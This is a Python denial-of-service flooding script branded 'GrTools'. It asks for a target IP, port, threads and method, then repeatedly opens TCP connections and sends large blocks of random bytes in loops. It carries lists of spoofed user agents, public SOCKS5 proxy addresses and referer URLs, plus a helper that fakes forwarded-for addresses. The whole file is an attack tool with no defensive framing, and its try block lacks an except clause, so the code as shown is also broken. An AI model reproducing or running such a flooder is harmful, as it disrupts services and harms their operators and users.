import socket
import random
import sys
import datetime
import ssl
import http.client
import threading
import os
import time
from sys import stdout

useragents = [
    'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1',
    'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1',
    'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
    # ...
]

socks5 = [
    '221.211.62.6:1111',
    '8.210.48.101:18193',
    '120.79.53.184:1080',
    # ...
]

https = [
    'http://search.aol.com/aol/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    # ...
]

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assembled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assembled

expiration_date = datetime.datetime.now() + datetime.timedelta(days=7)

ip = str(input("\033[36m╔══\n╚══════>Server@GrTools~ Enter Target IP : "))
port = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Port : "))
t = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Times : "))
th = int(input("\033[36m ╔══\n╚══════>Server@GrTools~ Input Thread : "))
method = str(input("╔══\n╚══════>Server@GrTools~~ Enter Methods : "))

def tcpfl():
    get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
    post_host = "POST /Attacked-by-GrTools HTTP/1.1\r\nHost: " + ip + "\r\n"
    get_data = "GET https://check-host.net//1.1\r\nHost: " + ip + "\r\n"
    referer = "Referer: " + random.choice(https) + ip + "\r\n"
    connection = "Connection: Keep-Alive\r\n" + "\r\n"
    content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
    socks = "socks5: " + random.choice(socks5) + "\r\n"
    length = "Content-Length: 0\r\n"
    forward = "X-Forwarded-For: 1\r\n"
    forwards = "Client-IP: " + ip + "\r\n"
    accept = random.choice(useragents) + "\r\n"
    mozila = "User-Agent: " + random.choice(useragents) + "\r\n"
    httpss = "User-Agent: " + random.choice(https) + "\r\n"
    connection += "X-Forwarded-For: " + spoofer() + "\r\n"
    request = get_host + post_host + get_data + httpss + mozila + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
    grtools = random._urandom(150404)
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.connect((ip, port))
            sock.send(grtools)
            sock.send(grtools)
            sock.send(grtools)
            sock.send(grtools)
            for x in range(75000):
                sock.send(grtools)
                sock.send(grtools)
                sock.send(grtools)
                sock.send(grtools)
                sock.send(grtools)
            sock.close()

if method.upper() == "TCP":
    t = threading.Thread(target=tcpfl)
    print("[GrBroadcast] Successfully sent")
    t.start()
